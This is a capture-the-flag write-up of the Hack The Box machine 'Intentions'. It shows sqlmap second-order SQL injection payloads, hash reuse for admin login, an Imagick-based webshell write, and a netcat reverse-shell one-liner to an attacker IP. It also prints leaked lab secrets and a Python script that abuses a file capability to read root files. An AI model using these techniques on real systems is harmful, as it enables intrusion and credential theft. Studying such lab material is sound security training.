---
title: "HTB Intentions"
draft: false
description: ""
categories: ["HTB"]
tags:
    [
        "htb-hard",
        "SQLi",
        "Second order SQLi",
        "PHPs Arbitrary Object Instantiation",
        "git",
        "Brute forcing hashes",
        "capabilities",
        "CAP_DAC_READ_SEARCH",
    ]
date: 2023-10-17T11:12:07+05:30
summary: "Intentions is a Hard linux box that involving a second-order SQL injection vulnerability which enables the extraction of admin password hashes. Leveraging a different API endpoint, these hashes can be used to access the admin page. Within the admin page, there's a feature to modify images, which relies on Imagick. This opens up an opportunity to exploit arbitrary object instantiation, ultimately allowing to write a PHP webshell and establishing a foothold. After gaining access to the system, credentials are found in an old Git commit in the website's repository. These credentials are reused for SSH access, allowing access to a user capable of running a copyright_scanner application, which has the CAP_DAC_READ_SEARCH capability. This capability can be exploited to read files as the root user."
---

# HTB Intentions

## Overview

---

> Intentions is a Hard linux box that involving a second-order SQL injection vulnerability which enables the extraction of admin password hashes. Leveraging a different API endpoint, these hashes can be used to access the admin page. Within the admin page, there's a feature to modify images, which relies on Imagick. This opens up an opportunity to exploit arbitrary object instantiation, ultimately allowing to write a PHP webshell and establishing a foothold. After gaining access to the system, credentials are found in an old Git commit in the website's repository. These credentials are reused for SSH access, allowing access to a user capable of running a copyright_scanner application, which has the `CAP_DAC_READ_SEARCH` capability. This capability can be exploited to read files as the root user.

---

## Enumeration

---

### Open Ports

Found two open ports

-   port 22 → SSH
-   port 80 → HTTP server

The port 4444 also seems to be open, but that looks like a false positive

```bash
nmap -p22,80,4444 -sV -sC -T4 -Pn -oA 10.10.11.220 10.10.11.220
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 19:40 EDT
Nmap scan report for 10.10.11.220
Host is up (0.060s latency).

PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 47d20066275ee69c808903b58f9e60e5 (ECDSA)
|_  256 c8d0ac8d299b87405f1bb0a41d538ff1 (ED25519)
80/tcp   open  http      nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Intentions
4444/tcp open  krb524?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### port 80 - HTTP

Based on the response headers, the website seems to employ a session cookie and JWT token for its functionality.

```bash
> http -ph 10.10.11.220
HTTP/1.1 200 OK
...snip...
...snip...
Server: nginx/1.18.0 (Ubuntu)
Set-Cookie: XSRF-TOKEN=eyJpdiI6IndVR0c0dFZTdWQxOWNCRVpMbDhyWVE9PSIsInZhbHVlIjoiTDN3SGJnWFRvczNFcmROak5kYlFuZkQ5cUFtMkMvOGEzT3BCV09DLzh0ZTZoRHViSDRvSVNqNkdTSCtiK0lOdDhKU1Q0WHd2T0JMazBhZ2JpL3lDVlBuamlTdm9zaGVuQklTRkJDUElWa0t0N2RJQlRwSGJRQjNnTzFabk10a0IiLCJtYWMiOiI4ZGNlMDA3MDhhODAzYWM2YzA0ZmUxNWMzMjQ3NmExM2RlY2UzZWY2ZGUyZTk2MjhjYmFiNmNiYzdiOTBhYTkwIiwidGFnIjoiIn0%3D; expires=Thu, 13-Jul-2023 01:46:05 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: intentions_session=eyJpdiI6IkxsdGdNVmtPV1p4Ry9yaWlGejFjN3c9PSIsInZhbHVlIjoib1RlMm9TWHFSYnIwZjB2NVp1cndPRHN1dWVMa0FNV2ZUYzl2eFJkb3NQaGVzYXR3QW1tL2ZKcklOZlZxNHBNN25RTVpHN1ZwRWxDRnhXNmlWMHZmbzRETE1OcFQwVUVBR1V2TUNwWW1xZktjU2lTc2Z2VXhaenM2S0ZnMis0ZmkiLCJtYWMiOiIzNzZmNjkxMGNjMzFlMDc4ZmViN2Y1ZWI3MzIyZGMwNjU1OTZhNjAxMzZiNjg4MGI0N2Q3NWI1NTE4OWQ1OTlkIiwidGFnIjoiIn0%3D; expires=Thu, 13-Jul-2023 01:46:05 GMT; Max-Age=7200; ...snip...

> urldecode 'eyJpdiI6IndVR0c0dFZTdWQxOWNCRVpMbDhyWVE9PSIsInZhbHVlIjoiTDN3SGJnWFRvczNFcmROak5kYlFuZkQ5cUFtMkMvOGEzT3BCV09DLzh0ZTZoRHViSDRvSVNqNkdTSCtiK0lOdDhKU1Q0WHd2T0JMazBhZ2JpL3lDVlBuamlTdm9zaGVuQklTRkJDUElWa0t0N2RJQlRwSGJRQjNnTzFabk10a0IiLCJtYWMiOiI4ZGNlMDA3MDhhODAzYWM2YzA0ZmUxNWMzMjQ3NmExM2RlY2UzZWY2ZGUyZTk2MjhjYmFiNmNiYzdiOTBhYTkwIiwidGFnIjoiIn0%3D' | base64 -d | jq
{
  "iv": "wUGG4tVSud19cBEZLl8rYQ==",
  "value": "L3wHbgXTos3ErdNjNdbQnfD9qAm2C/8a3OpBWOC/8te6hDubH4oISj6GSH+b+INt8JST4XwvOBLk0agbi/yCVPnjiSvoshenBISFBCPIVkKt7dIBTpHbQB3gO1ZnMtkB",
  "mac": "8dce00708a803ac6c04fe15c32476a13dece3ef6de2e9628cbab6cbc7b90aa90",
  "tag": ""
}
```

The website is PHP-based because accessing `/index.php` leads to the same index page. However, the site offers minimal information, mainly offering options for login and registration.

![index-page](./images/index-page.png)

#### Directory Enumeration

While fuzzing for files and directories, I came across a few interesting directories, and an empty robots.txt file.

```bash
> ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.11.220/FUZZ -o ffuf_intentions.md -of md -t 100 -fs 162
...snip...
...snip...
admin                   [Status: 302, Size: 322, Words: 60, Lines: 12, Duration: 288ms]
css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 60ms]
favicon.ico             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 59ms]
fonts                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 59ms]
gallery                 [Status: 302, Size: 322, Words: 60, Lines: 12, Duration: 522ms]
index.php               [Status: 200, Size: 1523, Words: 415, Lines: 40, Duration: 702ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 80ms]
logout                  [Status: 302, Size: 322, Words: 60, Lines: 12, Duration: 677ms]
robots.txt              [Status: 200, Size: 24, Words: 2, Lines: 3, Duration: 277ms]
storage                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 123ms]

```

Fuzzing recursively with `feroxbuster` due to the presence of directories like `admin` and `js`. Although there was no content under `/admin`, but there were a few interesting JS files, including `admin.js` and `login.js`.

```bash

> feroxbuster -u http://10.10.11.220/ -x php,txt,js
...snip...
...snip...
200      GET        2l     6382w   311246c http://10.10.11.220/js/admin.js
200      GET        2l     5429w   279176c http://10.10.11.220/js/login.js
302      GET       12l       22w        0c http://10.10.11.220/gallery => http://10.10.11.220
200      GET        2l     7687w   433792c http://10.10.11.220/js/app.js
200      GET        2l     6188w   310841c http://10.10.11.220/js/gallery.js
200      GET       39l       94w        0c http://10.10.11.220/index.php
...snip...
...snip...
```

<!-- Fuzzing recursively with `ffuf` due to the presence of directories like `admin` and `js`. Although there was no content under `/admin`, but there were a few interesting JS files, including `admin.js` and `login.js`.

```bash
Command line : `ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.11.220/FUZZ -o ffuf_intensions_recursive.md -of md -t 100 -fs 162 -e .php,.js -recursion -recursion-depth 1`

  | FUZZ | URL |
  | :- | :-- |
  | admin | http://10.10.11.220/admin |
  | css | http://10.10.11.220/css |
  | favicon.ico | http://10.10.11.220/favicon.ico |
  | fonts | http://10.10.11.220/fonts |
  | gallery | http://10.10.11.220/gallery |
  | index.php | http://10.10.11.220/index.php |
  | index.php | http://10.10.11.220/index.php |
  | js | http://10.10.11.220/js |
  | logout | http://10.10.11.220/logout |
  | robots.txt | http://10.10.11.220/robots.txt |
  | storage | http://10.10.11.220/storage |
  | vendor | http://10.10.11.220/fonts/vendor |
  | admin.js | http://10.10.11.220/js/admin.js |
  | app.js | http://10.10.11.220/js/app.js |
  | gallery.js | http://10.10.11.220/js/gallery.js |
  | login.js | http://10.10.11.220/js/login.js |
  | mdb.js | http://10.10.11.220/js/mdb.js |
  | architecture | http://10.10.11.220/storage/architecture |
  | food | http://10.10.11.220/storage/food|

``` -->

The `admin.js` file has some interesting content:

-   Production environment hosts a v2 API deployment.
-   The v2 API seems to transmit password hashes instead of clear text passwords, presumably to enhance security.
-   The v2 API has some image editing functionalities, likely using the [Imagick PHP module](https://www.php.net/manual/en/book.imagick.php).

![admin-js-content](./images/admin-js-content.png "Content from admin.js")

---

## Foothold

---

Successfully registered a user using the registration feature. It appears that there's a gallery and a user feed on the platform, featuring images that can be tagged by genres.

![post-login-index-page](./images/post-login-index-page.png)

![user-feed](./images/user-feed.png)

After walking the application, it's clear the feed content is dependent on genre preferences in the profile settings. Modifying the genre results in corresponding changes to the feed content.

![profile-settings](./images/profile-settings.png)

Although, response of a union injection is interesting. All spaces within the payload are stripped out. This can potentially be circumvented by replacing the spaces with SQL comments (`/**/`).

![union-sqli-render](./images/union-sqli-render.png)

_Union injection payload_

```json
{
    "genres": "food,travel,nature' union select 1 -- -"
}
```

There might be an escape function in place to sanitize the input for genres. However, since this input has an impact on the feed, there is a potential for exploiting second-order SQL injection.

Using `sqlmap`, discovered a second-order SQL injection in there. I successfully exploited the vulnerability using `sqlmap`, which indicates that the backend database is MariaDB.

-   `gallery_genres.req`: The POST request to change the genres → the injection point
-   `galley_feed.req`: The GET request for the user feed
-   `space2comment`: A sqlmap tamper script to replace spaces with comments, bypassing the sanitization process.

```bash
> sqlmap -r gallery_genres.req --level 5 --risk 3 --second-req gallery_feed.req --batch --tamper=space2comment --threads 10

[21:08:39] [INFO] (custom) POST parameter 'JSON genres' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
(custom) POST parameter 'JSON genres' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 300 HTTP(s) requests:
---
Parameter: JSON genres ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"genres":"food,travel,nature') AND 2611=2611 AND ('pGZT'='pGZT"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"genres":"food,travel,nature') AND (SELECT 5190 FROM (SELECT(SLEEP(5)))jJoL) AND ('LKKQ'='LKKQ"}

    Type: UNION query
    Title: MySQL UNION query (NULL) - 7 columns
    Payload: {"genres":"food,travel,nature') UNION ALL SELECT NULL,CONCAT(0x71707a7671,0x6959496e6664714d6c4255494f416975476363525a6d6b7957427a6e7450636b4d536f6b4e68554e,0x7170787a71),NULL,NULL,NULL#"}
---
[21:08:39] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[21:08:39] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)

```

Exploiting the vulnerability revealed a database named `intentions` and a couple interesting tables like `personal_access_tokens` and `users`.

```bash
> sqlmap -r gallery_genres.req --level 5 --risk 3 --second-req gallery_feed.req --batch --tamper=space2comment --threads 10 --dbs

...snip...
[21:14:00] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] intentions
...snip...

> sqlmap -r gallery_genres.req --level 5 --risk 3 --second-req gallery_feed.req --batch --tamper=space2comment --threads 10 -D intentions --tables

...snip...
[21:16:57] [INFO] fetching tables for database: 'intentions'
Database: intentions
[4 tables]
+------------------------+
| gallery_images         |
| migrations             |
| personal_access_tokens |
| users                  |
+------------------------+
...snip...
```

Dumped the `users` table and retrieved information for two admin users: `steve` and `greg`, including their corresponding password hashes. The password hashes are encrypted using bcrypt with 10 iterations, which means that decrypting wouldn't be practical.

```bash
> sqlmap -r gallery_genres.req --level 5 --risk 3 --second-req gallery_feed.req --batch --tamper=space2comment --threads 10 -D intentions -T users --dump

Database: intentions
Table: users
[33 entries]
+----+--------------------------+-------+-------------------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+
| id | name                     | admin | email                         | genres                                                                                                                                                          | password                                                     | created_at          | updated_at          |
+----+--------------------------+-------+-------------------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+
| 1  | steve                    | 1     | steve@intentions.htb          | food,travel,nature                                                                                                                                              | $2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa | 2023-02-02 17:43:00 | 2023-02-02 17:43:00 |
| 2  | greg                     | 1     | greg@intentions.htb           | food,travel,nature                                                                                                                                              | $2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m | 2023-02-02 17:44:11 | 2023-02-02 17:44:11 |
| 3  | Melisa Runolfsson        | 0     | hettie.rutherford@example.org | food,travel,nature
```

Referring back to the information obtained from the `admin.js` file, it was revealed that the v2 API offers authentication using hashes. So, there is no need to crack the password hash. When sending login requests through the v2 API, the response specifies the necessity of a hash POST parameter for authentication.

![v2-API-error](./images/v2-API-error.png "v2 API error")

By including the hash parameter along with its associated value in the request, a 200 response is generated. Furthermore, this response includes the setting of a token cookie, which contains a JWT for the user steve.

![v2-API-admin-login](./images/v2-API-admin-login.png "Successful admin login via v2 API")

Given that Steve possesses admin privileges, utilizing their cookie and navigating to `/admin` successfully grants access to the admin page. This page corresponds to the JavaScript file uncovered previously.

![admin-page](./images/admin-page.png "Admin Page")

The admin page includes a new `Images` tab, whereas the user feed and profile settings are no longer present. It provides a list of images used in the application, along with an option to edit them.

![image-list-page](./images/image-list-page.png "Admin images")

The edit page contains information about the selected image, including various effects and other details related to it.

![edit-image-effects](./images/edit-image-effects.png)

When applying one of the effects, a request is sent to the `/api/v2/admin/image/modify` endpoint. This endpoint expects two parameters, `path` and `effect`, and in return, it provides an image data URL as a response.

![modify-image-burp](./images/modify-image-burp.png "Modify image endpoint")

The endpoint accepts a file path. However, when attempting to use a URI, link to an image on my attack box hosted via an HTTP server or the file://<local-file> format, both methods simply return a data URL.
Considering the Imagick module is being used for the modifications, found an exploit that involves arbitrary object instantiations in PHP: [Exploiting Arbitrary Object Instantiations in PHP without Custom Classes – PT SWARM](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

The exploit employs an MSL file and suggests brute-force for remote code execution, both of which might not be feasible in this scenario. Another approach involves utilizing a VID schema. In ImageMagick, the ReadVIDImage function is used for reading VID schemas, which relies on ExpandFilenames. This function expands arguments if they contain wildcards. By exploiting this behavior, the MSL file can be included in the request. Using two additional schemas, `info` and `caption`, a webshell can be written with a single request. Given that the body of the request will carry the MSL file, the request's arguments are transmitted as GET parameters. The `effect` parameter remains unchanged, while the `path` parameter is configured as a VID schema.

With the option to create a webshell, the next step was making it externally accessible to execute the payload. Based on the information of images from the admin page, files are stored at `/var/www/html/intentions/storage/app/public/*` can be accessed externally using the format `http://<IP>/storage/<filename>`.

![file-write-exploit](./images/file-write-exploit.png "Actual Exploit")

Sending this request creates a shell at `http://<IP>/storage/shell.php`, which can gives the ability to execute remote commands using the `cmd` parameter.

```bash
> http -pb intentions.htb/storage/shell.php cmd==id
caption:uid=33(www-data) gid=33(www-data) groups=33(www-data)
 CAPTION 120x120 120x120+0+0 16-bit sRGB 2.960u 0:02.962
```

Using a reverse shell payload, got a shell as `www-data`

```bash
> http -pb intentions.htb/storage/shell.php cmd=='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.20 9005 >/tmp/f'
```

```bash
> pc -lp 9005
[03:16:33] Welcome to pwncat 🐈!                                                                    __main__.py:164
[03:16:40] received connection from 10.10.11.220:42804                                                   bind.py:84
[03:16:41] 0.0.0.0:9005: upgrading from /usr/bin/dash to /usr/bin/bash                               manager.py:957
[03:16:42] 10.10.11.220:42804: registered new host w/ db                                             manager.py:957
(local) pwncat$
(remote) www-data@intentions:/var/www/html/intentions/storage/app/public$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Shell as greg

---

Based on the contents of the `/home` directory and `/etc/passwd` there are two other user with login shells, `legal` and `greg`.

```bash
(remote) www-data@intentions:/var/www/html/intentions$ ls -la /home/
total 20
drwxr-xr-x  5 root   root   4096 Jun 10 14:56 .
drwxr-xr-x 18 root   root   4096 Jun 19 13:34 ..
drwxr-x---  4 greg   greg   4096 Jul 14 09:28 greg
drwxr-x---  4 legal  legal  4096 Jun 19 13:09 legal
drwxr-x---  4 steven steven 4096 Jun 19 13:09 steven
(remote) www-data@intentions:/var/www/html/intentions$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
steven:x:1000:1000:steven:/home/steven:/bin/bash
greg:x:1001:1001::/home/greg:/bin/sh
legal:x:1002:1002:,,,:/home/legal:/bin/bash
```

A `.gitignore` file exists in the public directory, indicating there's a git repo somewhere.

```bash
(remote) www-data@intentions:/var/www/html/intentions/storage/app/public$ ls -la
total 32
drwxr-xr-x 6 www-data www-data 4096 Jul 16 07:15 .
drwxr-xr-x 3 www-data www-data 4096 Feb  2 16:41 ..
-rw-r--r-- 1 www-data www-data   14 Apr 12  2022 .gitignore
drwxr-xr-x 2 root     root     4096 Feb  2 01:09 animals
drwxr-xr-x 2 root     root     4096 Feb  2 01:08 architecture
drwxr-xr-x 2 root     root     4096 Feb  2 01:07 food
drwxr-xr-x 2 root     root     4096 Feb  2 01:07 nature
-rw-r--r-- 1 www-data www-data   95 Jul 16 07:15 shell.php
(remote) www-data@intentions:/var/www/html/intentions/storage/app/public$ cat .gitignore
*
!.gitignore
```

Going up a few directories, identified a git repository situated at `/var/www/html/intentions`, as indicated by the presence of the `.git/` directory.

```bash
(remote) www-data@intentions:/var/www/html/intentions$ ls -la
total 820
drwxr-xr-x  14 root     root       4096 Feb  2 17:55 .
drwxr-xr-x   3 root     root       4096 Feb  2 17:55 ..
-rw-r--r--   1 root     root       1068 Feb  2 17:38 .env
drwxr-xr-x   8 root     root       4096 Feb  3 00:51 .git
...snip...
```

The `.env` file contains several interesting details including the application key, database username and password, and the JWT secret.

```bash
remote) www-data@intentions:/var/www/html/intentions$ cat .env
APP_NAME=Intentions
APP_ENV=production
APP_KEY=base64:YDGHFO792XTVdInb9gGESbGCyRDsAIRCkKoIMwkyHHI=
APP_DEBUG=false
APP_URL=http://intentions.htb
...snip...
...snip...
DB_CONNECTION=mysql
DB_HOST=localhost
DB_PORT=3306
DB_DATABASE=intentions
DB_USERNAME=laravel
DB_PASSWORD=02mDWOgsOga03G385!!3Plcx
...snip...
...snip...
JWT_SECRET=yVH9RCGPMXyzNLoXrEsOl0klZi3MAxMHcMlRAnlobuSO8WNtLHStPiOUUgfmbwPt
```

I couldn't enumerate the repository because of an ownership issue of root directory.

```bash
(remote) www-data@intentions:/var/www/html/intentions$ git log
fatal: detected dubious ownership in repository at '/var/www/html/intentions'
To add an exception for this directory, call:

    git config --global --add safe.directory /var/www/html/intentions
(remote) www-data@intentions:/var/www/html/intentions$ git config --global --add safe.directory /var/www/html/intentions
error: could not lock config file /var/www/.gitconfig: Permission denied)
```

The only viable approach for to enumerate the repository involves archiving it and subsequently downloading the generated archive.

```bash
(remote) www-data@intentions:/tmp$ tar -cf intentions.tar /var/www/html/intentions
tar: Removing leading `/' from member names
(local) pwncat$ download intentions.tar
intentions.tar  100.0% • 270.5/270.5 MB • 1.6 MB/s • 0:00:00
[03:53:25] downloaded 270.51Mi━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━B in 5.0 minutes and 11 seconds                                        download.py:71
(local) pwncat$
```

Judging by the commit message, it's possible that the second-to-last commit in the git log could reveal something of interest.

```bash
> git lg

1f29dfd steve    (5 months ago) - Fix webpack for production (HEAD -> master)
f7c903a greg     (5 months ago) - Test cases did not work on steve's local database, switching to user factory per his advice
36b4287 greg     (5 months ago) - Adding test cases for the API!
d7ef022 steve    (5 months ago) - Initial v2 commit
(END)

```

The diff for the mentioned commit contains the password for the user, greg → `greg:Gr3g1sTh3B3stDev3l0per!1998!`

```diff
> git show f7c903a

commit f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4
Author: greg <greg@intentions.htb>
Date:   Thu Jan 26 09:21:52 2023 +0100

    Test cases did not work on steve's local database, switching to user factory per his advice

diff --git a/tests/Feature/Helper.php b/tests/Feature/Helper.php
index f57e37b..0586d51 100644
--- a/tests/Feature/Helper.php
+++ b/tests/Feature/Helper.php
@@ -8,12 +8,14 @@ class Helper extends TestCase
 {
     public static function getToken($test, $admin = false) {
         if($admin) {
-            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
-            return $res->headers->get('Authorization');
+            $user = User::factory()->admin()->create();
         }
         else {
-            $res = $test->postJson('/api/v1/auth/login', ['email' => 'greg_user@intentions.htb', 'password' => 'Gr3g1sTh3B3stDev3l0per!1998!']);
-            return $res->headers->get('Authorization');
+            $user = User::factory()->create();
         }
+
+        $token = Auth::login($user);
+        $user->delete();
+        return $token;
     }
 }

```

Although the new credentials didn't provide any additional insights on the website, they were reused for Greg's local account. As a result, logged in through SSH.

```bash
(local) pwncat$ connect greg:Gr3g1sTh3B3stDev3l0per!1998!@intentions.htb
[06:04:53] intentions.htb:22: upgrading from /usr/bin/dash to /usr/bin/bash                          manager.py:957
[06:04:54] intentions.htb:22: loaded known host from db                                              manager.py:957
(local) pwncat$
(remote) greg@intentions:/home/greg$ id
uid=1001(greg) gid=1001(greg) groups=1001(greg),1003(scanner)
(remote) greg@intentions:/home/greg$
```

---

## Privilege Escalation to root

---

Unfortunately, Greg lacks sudo privileges

```bash
(remote) greg@intentions:/home/greg$ sudo -l
[sudo] password for greg:
Sorry, user greg may not run sudo on intentions.
```

Greg, interestingly, is also a member of the scanner group. While searching for files accessible to the group, discovered the scanner binary, owned by root.

```bash
(remote) greg@intentions:/home/greg$ id
uid=1001(greg) gid=1001(greg) groups=1001(greg),1003(scanner)
(remote) greg@intentions:/home/greg$ find / -group scanner 2>/dev/null
/opt/scanner
/opt/scanner/scanner
(remote) greg@intentions:/home/greg$ ls -la /opt/scanner/scanner
-rwxr-x--- 1 root scanner 1437696 Jun 19 11:18 /opt/scanner/scanner
(remote) greg@intentions:/home/greg$ file /opt/scanner/scanner
/opt/scanner/scanner: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=a7sTitVjvr1qc4Ngg3jt/LY6QPsAiDYUOHaK7gUXN/5aWVPmSwER6KHrDxGzr4/SUP48whD2UTLJ-Q2kLmf, stripped
(remote) greg@intentions:/home/greg$ getcap /opt/scanner/scanner
/opt/scanner/scanner cap_dac_read_search=ep
```

The capability the file has, `CAP_DAC_READ_SEARCH` essentially means it can read any file on the box.

>     CAP_DAC_READ_SEARCH
>          •  Bypass file read permission checks and directory read
>             and execute permission checks;
>          •  invoke open_by_handle_at(2);
>          •  use the linkat(2) AT_EMPTY_PATH flag to create a link
>             to a file referred to by a file descriptor.

As there no manual page entries were available for `scanner`, the `-h` or `--help` options are the most effective approach to gather additional information about the binary. According to the help message, it appears to be a utility that uses MD5 hashes to identify copyrighted data.

```bash

(remote) greg@intentions:/home/greg$ /opt/scanner/scanner --help
The copyright_scanner application provides the capability to evaluate a single file or directory of files against a known blacklist and return matches.

    This utility has been developed to help identify copyrighted material that have previously been submitted on the platform.
    This tool can also be used to check for duplicate images to avoid having multiple of the same photos in the gallery.
    File matching are evaluated by comparing an MD5 hash of the file contents or a portion of the file contents against those submitted in the hash file.

    The hash blacklist file should be maintained as a single LABEL:MD5 per line.
    Please avoid using extra colons in the label as that is not currently supported.

    Expected output:
    1. Empty if no matches found
    2. A line for every match, example:
        [+] {LABEL} matches {FILE}

  -c string
        Path to image file to check. Cannot be combined with -d
  -d string
        Path to image directory to check. Cannot be combined with -c
  -h string
        Path to colon separated hash file. Not compatible with -p
  -l int
        Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)
  -p    [Debug] Print calculated file hash. Only compatible with -c
  -s string
        Specific hash to check against. Not compatible with -h
```

Also, found a bash script in the home directory that executes scanner against some documents in `/home/legal/uploads`. Unfortunately, greg has no write access in that directory, but scanner does via the capability.

```bash
(remote) greg@intentions:/home/greg$ cat dmca_check.sh
/opt/scanner/scanner -d /home/legal/uploads -h /home/greg/dmca_hashes.test
```

When trying to test scanner's functionality, I noticed that the hashes were different

```bash
(remote) greg@intentions:/tmp$ echo -n '1234' > scanner_test
(remote) greg@intentions:/tmp$ md5sum scanner_test
81dc9bdb52d04dc20036dbd8313ed055  scanner_test
(remote) greg@intentions:/tmp$ /opt/scanner/scanner -c ./scanner_test -s '81dc9bdb52d04dc20036dbd8313ed055' -p
[DEBUG] ./scanner_test has hash 8b2460b545079292869605c18cc18c81
```

According to the information from the help page, the number of hashed bytes can be defined using the `-l` option. By setting the number of bytes to 4, as in the example provided, the correct hash is generated. This explains why the mismatched hashes when the `-l` option wasn't utilized, as the default size is 500 bytes.

```bash
(remote) greg@intentions:/tmp$ /opt/scanner/scanner -c /tmp/scanner_test -s '81dc9bdb52d04dc20036dbd8313ed055' -p -l 1
[DEBUG] /tmp/scanner_test has hash c4ca4238a0b923820dcc509a6f75849b
(remote) greg@intentions:/tmp$ echo -n '1' | md5sum -
c4ca4238a0b923820dcc509a6f75849b  -

(remote) greg@intentions:/tmp$ /opt/scanner/scanner -c /tmp/scanner_test -s '81dc9bdb52d04dc20036dbd8313ed055' -p -l 2
[DEBUG] /tmp/scanner_test has hash c20ad4d76fe97759aa27a0c99bff6710
(remote) greg@intentions:/tmp$ echo -n '12' | md5sum -
c20ad4d76fe97759aa27a0c99bff6710  -

(remote) greg@intentions:/tmp$ /opt/scanner/scanner -c /tmp/scanner_test -s '81dc9bdb52d04dc20036dbd8313ed055' -p -l 3
[DEBUG] /tmp/scanner_test has hash 202cb962ac59075b964b07152d234b70
(remote) greg@intentions:/tmp$ echo -n '123' | md5sum -
202cb962ac59075b964b07152d234b70  -

(remote) greg@intentions:/tmp$ /opt/scanner/scanner -c /tmp/scanner_test -s '81dc9bdb52d04dc20036dbd8313ed055' -p -l 4
[DEBUG] /tmp/scanner_test has hash 81dc9bdb52d04dc20036dbd8313ed055
[+] 81dc9bdb52d04dc20036dbd8313ed055 matches /tmp/scanner_test
```

This functionality could potentially be exploited to read files by essentially brute-forcing the hashes. Given that the binary is owned by the root user, ideally it could be used to read any file on the system. It would take too long to do this manually, so wrote a python script to automate the process.

### Brute-force automation script

The script consists of the following functions:

-   `grab_hash()`: Retrieves the hash generated by the `scanner` binary
-   `gen_hash()`: Generates an MD5 hash.
-   `correct_char()`: Compares hashes obtained from both functions to identify the character corresponding to the hash produced by the `scanner` binary

The script accepts a filename as a parameter and then initiates an infinite loop with the counter beginning at 1. Within each loop iteration:

-   The `grab_hash()` function is invoked with increasing hash lengths.
-   The hash obtained from `grab_hash()` is passed to `correct_char()` to identify the correct character.
-   The `correct_char()` generates md5 hashes for the decoded data + a character from the charset and matches it to the hash from scanner. If a match is found, the character is appended to the decoded data.
-   Within `correct_char()`, MD5 hashes are generated for the decoded data plus a character from the charset, and compared to the hash obtained from the `scanner`. If a match is found, the character is added to the decoded data.
-   In case no match is found, the infinite loop terminates, indicating either the complete data retrieval or the absence of the target character within the character set.

```python
#!/usr/bin/env python

import hashlib
import string
import subprocess
import sys
from itertools import count


def grab_hash(fileName: str, hash_length: int, hash_value: str = "test_hash"):
    # command = f"/opt/scanner/scanner -c {fileName} -s {hash_value} -p -l {hash_length}"
    # os.system(command)
    command = f"/opt/scanner/scanner -c {fileName} -s {hash_value} -p -l {hash_length}"
    process = subprocess.run(command, shell=True, capture_output=True, text=True)

    scanner_output = process.stdout
    scanner_err = process.stderr.strip()

    if scanner_err != "":
        print(f"Error: {scanner_err}")
        sys.exit()

    # print(scanner_output)
    hash = scanner_output.strip().split(" ")[4]
    # print(hash)
    return hash


def gen_hash(text: str):
    hashed_text = hashlib.md5(text.encode()).hexdigest()
    return hashed_text


def correct_char(temp_hash: str):
    for char in charset:
        data = decoded_text + char
        new_hash = gen_hash(data)
        if temp_hash == new_hash:
            return char
    return None


fileName = sys.argv[1]

if len(sys.argv) != 2:
    print("FileName needed")
    sys.exit()

charset = string.printable
decoded_text = ""
# hash_value = sys.argv[2]
# hash_length = sys.argv[3]

for i in count(1):
    try:
        test_hash = grab_hash(fileName, i)
        test_char = correct_char(test_hash)
        if test_char is None:
            break
        decoded_text += test_char
    except Exception as e:
        print(f"An error occurred: {e}")
        sys.exit(1)


print(f"File content: \n{decoded_text}")
```

Testing this with the user flag is successful, meaning the script works!

```bash
(remote) greg@intentions:/tmp$ cat ~/user.txt
c317b23bf4affb80fd3d93b813dcaaf1
(remote) greg@intentions:/tmp$ python3 gimme_root.py /home/greg/user.txt
File content:
c317b23bf4affb80fd3d93b813dcaaf1
```

Similarly, the root flag can be obtained using a similar approach. By running a loop and sequentially matching hash values, the flag's characters can be decoded and the root flag extracted.

```bash
(remote) greg@intentions:/tmp$ python3 gimme_root.py /root/root.txt
File content:
de01b4e5992cf6a18283887bdc30b11d
```

Retrieved the SSH private key using the same script.

```bash
(remote) greg@intentions:/tmp$ python3 gimme_root.py /root/.ssh/id_rsa
File content:
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...snip...
```

The SSH key can be used to log in as the root user via SSH.

